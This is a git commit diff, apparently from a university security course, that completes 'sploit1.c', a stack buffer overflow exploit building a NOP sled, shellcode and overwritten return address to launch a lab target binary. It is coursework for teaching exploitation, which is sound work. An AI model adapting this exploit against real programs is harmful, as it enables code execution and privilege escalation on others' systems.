10d4a4ee5e6a1ead46603fd95ea3f1d2bf7ee874
Wei Shi <weishi@stanford.edu>
2013-04-05 19:06:51 -0700

    Finished sploit1

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -5,13 +5,25 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target1"
+#define PAYLOAD_SIZE (256+4+4+4+4+1)
+#define NOP (0x90)
+#define RET_ADDR (0xbffffc30)
 
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char payload[PAYLOAD_SIZE];
+
+  /* Build payload */
+  memset(payload, NOP, PAYLOAD_SIZE);
+  payload[PAYLOAD_SIZE-1]='\0';
+  memcpy(payload, shellcode, strlen(shellcode));
+  *(int *)(payload+PAYLOAD_SIZE-1-4)=RET_ADDR;
+
+
+  args[0] = TARGET; args[1] = payload; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
